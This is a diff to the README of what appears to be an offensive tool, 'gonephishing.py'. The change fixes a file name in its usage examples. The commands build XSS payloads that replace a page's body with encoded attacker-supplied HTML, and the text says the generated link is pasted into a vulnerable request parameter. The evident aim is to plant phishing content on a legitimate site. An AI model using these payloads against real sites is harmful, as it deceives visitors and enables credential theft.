@@ -21,12 +21,14 @@ This is all very new so treat it gently. It may not have long to go (chrome brow
  
  Current supported encoders are b64 and hex.
 
+
+Create a file called test.html (the @ sign below signifies that you are using a file rather than direct input)
 ~~~
-python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64
 
-python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=("%s")</script>'  --encoders --encoders hex
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("%s")</script>'  --encoders --encoders hex
 
-python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64,hex 
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64,hex 
 ~~~
 Paste the generated link into the vulnerable request parameter and the page should be overwritten with the supplied html.
 
